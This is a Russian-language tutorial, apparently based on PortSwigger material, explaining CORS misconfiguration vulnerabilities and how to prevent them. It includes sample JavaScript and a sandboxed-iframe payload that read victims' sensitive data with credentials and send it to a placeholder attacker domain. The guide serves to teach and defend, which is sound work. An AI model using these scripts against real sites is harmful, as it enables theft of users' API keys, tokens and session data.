В этом разделе мы объясним, что такое CORS, опишем некоторые распространённые примеры атак, связанных с его неправильной настройкой, и обсудим, как защититься от этих атак. Эта тема была подготовлена в сотрудничестве с **PortSwigger Research**, которые популяризировали данный класс атак в своей презентации _«Exploiting CORS misconfigurations for Bitcoins and bounties»_.

### Что такое CORS (Cross-Origin Resource Sharing)?

**CORS** — это механизм браузера, который обеспечивает контролируемый доступ к ресурсам, находящимся за пределами данного домена. Он расширяет и добавляет гибкость к политике одного источника (**Same-Origin Policy, SOP**).

Однако CORS также создаёт потенциал для междоменных атак, если политика CORS на сайте настроена и реализована неправильно.

Важно понимать, что **CORS не является защитой от междоменных атак**, таких как **CSRF (Cross-Site Request Forgery)**

![[attack-on-cors.svg]]

## Политика одного источника (Same-Origin Policy, SOP)

Политика одного источника — это ограничительная междоменная спецификация, которая ограничивает возможность веб‑сайта взаимодействовать с ресурсами за пределами исходного домена. Политика одного источника была определена много лет назад в ответ на потенциально вредоносные междоменные взаимодействия, такие как кража одним сайтом приватных данных с другого. В целом она позволяет домену отправлять запросы к другим доменам, но не позволяет получать доступ к их ответам.

## Ослабление политики одного источника

Политика одного источника очень ограничительна, и поэтому были разработаны различные подходы для обхода этих ограничений. Многие сайты взаимодействуют с поддоменами или сторонними ресурсами таким образом, что требуется полный междоменный доступ. Контролируемое ослабление политики одного источника возможно с помощью механизма **CORS (Cross-Origin Resource Sharing)**.

Протокол CORS использует набор HTTP‑заголовков, которые определяют доверенные веб‑источники и связанные свойства, например, разрешён ли аутентифицированный доступ. Эти заголовки обмениваются между браузером и междоменным сайтом, к которому он пытается получить доступ.

## Уязвимости, возникающие из-за ошибок конфигурации CORS

Многие современные сайты используют CORS, чтобы разрешить доступ с поддоменов и доверенных сторонних ресурсов. Их реализация CORS может содержать ошибки или быть чрезмерно либеральной, чтобы «всё работало», и это может привести к эксплуатируемым уязвимостям.

### Заголовок ACAO, сгенерированный сервером на основе Origin из запроса

Некоторым приложениям нужно предоставлять доступ множеству других доменов. Поддержание списка разрешённых доменов требует постоянных усилий, и любая ошибка может нарушить функциональность. Поэтому некоторые приложения выбирают лёгкий путь — фактически разрешают доступ с любого домена.

Один из способов сделать это — считывать заголовок **Origin** из запроса и включать в ответ заголовок, утверждающий, что запрашивающий источник разрешён.

**Пример:**

Запрос:

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

Ответ:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

Эти заголовки указывают, что доступ разрешён с домена `malicious-website.com`, и что междоменные запросы могут включать cookies (`Access-Control-Allow-Credentials: true`), а значит, будут обработаны в рамках сессии.

Так как приложение отражает произвольные источники в заголовке **Access-Control-Allow-Origin**, это означает, что абсолютно любой домен может получить доступ к ресурсам уязвимого домена.

Если ответ содержит конфиденциальную информацию, такую как API‑ключ или CSRF‑токен, её можно извлечь, разместив на своём сайте следующий скрипт:

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
};
```

## Ошибки при разборе заголовков Origin

Некоторые приложения, поддерживающие доступ с нескольких источников, делают это с помощью белого списка разрешённых источников. Когда поступает CORS‑запрос, указанный источник сравнивается с белым списком. Если источник есть в списке, он отражается в заголовке **Access-Control-Allow-Origin**, и доступ разрешается.

**Пример:**

Запрос:
```
GET /data HTTP/1.1
Host: normal-website.com
Origin: https://innocent-website.com

```

Ответ:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://innocent-website.com

```

Ошибки часто возникают при реализации белых списков CORS. Некоторые организации решают разрешить доступ со всех своих поддоменов (включая будущие, ещё не существующие). А некоторые приложения разрешают доступ с доменов других организаций, включая их поддомены. Эти правила часто реализуются через сопоставление префиксов или суффиксов URL или с помощью регулярных выражений. Любые ошибки в реализации могут привести к предоставлению доступа нежелательным внешним доменам.

**Примеры:**

- Если доступ разрешён для всех доменов, оканчивающихся на: `normal-website.com` злоумышленник может зарегистрировать домен: `hackersnormal-website.com`
    
- Если доступ разрешён для всех доменов, начинающихся с: `normal-website.com` злоумышленник может использовать домен: `normal-website.com.evil-user.net`
    

## Белый список со значением null

Спецификация заголовка **Origin** поддерживает значение `null`. Браузеры могут отправлять `null` в Origin в различных необычных ситуациях:

- междоменные перенаправления,
    
- запросы из сериализованных данных,
    
- запросы с использованием протокола `file:`,
    
- изолированные (sandboxed) междоменные запросы.
    

Некоторые приложения могут вносить `null` в белый список для поддержки локальной разработки.

**Пример:**

Запрос:
```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null

```

Ответ:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

```

В такой ситуации злоумышленник может использовать различные трюки, чтобы сгенерировать междоменный запрос со значением `null` в Origin. Это удовлетворит белый список и приведёт к междоменному доступу. Например, это можно сделать с помощью sandboxed‑iframe:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>

```

## Эксплуатация XSS через доверительные отношения CORS

Даже «правильно» настроенный CORS устанавливает доверительные отношения между двумя источниками. Если сайт доверяет источнику, уязвимому к XSS, злоумышленник может использовать XSS для внедрения JavaScript, который через CORS получит конфиденциальные данные с доверяющего сайта.

**Пример:**

Запрос:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...

```

Ответ:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true

```

Если злоумышленник найдёт XSS на `subdomain.vulnerable-website.com`, он сможет использовать его для получения API‑ключа, например:

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>

```

## Нарушение TLS из-за неправильно настроенного CORS

Предположим, приложение строго использует HTTPS, но также вносит в белый список доверенный поддомен, работающий по обычному HTTP.

**Пример:**

Запрос:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...

```

Ответ:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true

```

В такой ситуации злоумышленник, способный перехватывать трафик жертвы, может использовать конфигурацию CORS для компрометации взаимодействия жертвы с приложением.

**Ход атаки:**

1. Жертва делает любой HTTP‑запрос.
    
2. Злоумышленник внедряет редирект на: `http://trusted-subdomain.vulnerable-website.com`
    
3. Браузер жертвы следует редиректу.
    
4. Злоумышленник перехватывает HTTP‑запрос и возвращает поддельный ответ, содержащий CORS‑запрос к: `https://vulnerable-website.com`
    
5. Браузер жертвы делает CORS‑запрос с Origin: `http://trusted-subdomain.vulnerable-website.com`
    
6. Приложение разрешает запрос, так как этот источник в белом списке. Конфиденциальные данные возвращаются в ответе.
    
7. Поддельная страница злоумышленника считывает данные и отправляет их на контролируемый им домен.
    

Эта атака эффективна даже если сайт в остальном строго использует HTTPS, не имеет HTTP‑эндпоинтов и все cookies помечены как secure.

## Интранеты и CORS без учётных данных

Большинство атак на основе CORS зависят от наличия в ответе заголовка: **Access-Control-Allow-Credentials: true**

Без этого заголовка браузер жертвы откажется отправлять её cookies, что означает: злоумышленник получит доступ только к неаутентифицированному контенту, который он мог бы так же легко просмотреть, просто открыв целевой сайт напрямую.

Однако есть одна распространённая ситуация, когда злоумышленник не может напрямую получить доступ к сайту: когда он является частью **интранета организации** и расположен в пространстве частных IP‑адресов. Внутренние сайты часто имеют более низкий уровень безопасности по сравнению с внешними, что позволяет злоумышленникам находить уязвимости и получать дальнейший доступ.

**Пример:**

Кросс‑доменный запрос внутри частной сети:
```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com

```

Ответ сервера:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

```

Сервер приложения доверяет запросам ресурсов с любого источника **без учётных данных**. Если пользователи внутри частного IP‑пространства выходят в интернет, то CORS‑атака может быть выполнена с внешнего сайта, который использует браузер жертвы как прокси для доступа к ресурсам интранета.

## Как предотвратить атаки на основе CORS

Уязвимости CORS возникают в первую очередь из‑за ошибок конфигурации. Следовательно, их предотвращение — это задача правильной настройки. Ниже приведены эффективные меры защиты.

### Корректная настройка междоменных запросов

Если веб‑ресурс содержит конфиденциальную информацию, источник должен быть явно указан в заголовке **Access-Control-Allow-Origin**.

### Разрешайте только доверенные сайты

Очевидно, что источники, указанные в **Access-Control-Allow-Origin**, должны быть только доверенными. В частности, динамическое отражение источников из междоменных запросов без проверки легко эксплуатируется и должно быть исключено.

### Избегайте добавления `null` в белый список

Не используйте заголовок **Access-Control-Allow-Origin: null**. Междоменные вызовы ресурсов из внутренних документов и изолированных (sandboxed) запросов могут указывать `null` как источник. Заголовки CORS должны быть корректно определены в отношении доверенных источников как для частных, так и для публичных серверов.

### Избегайте подстановочных знаков во внутренних сетях

Не используйте `*` во внутренних сетях. Доверие только к сетевой конфигурации для защиты внутренних ресурсов недостаточно, когда внутренние браузеры могут обращаться к ненадёжным внешним доменам.

### CORS не заменяет серверные политики безопасности

CORS определяет поведение браузера и никогда не является заменой серверной защите конфиденциальных данных. Злоумышленник может напрямую подделать запрос с любого доверенного источника. Поэтому веб‑серверы должны продолжать применять защиту над конфиденциальными данными (например, аутентификацию и управление сессиями) **в дополнение** к правильно настроенному CORS.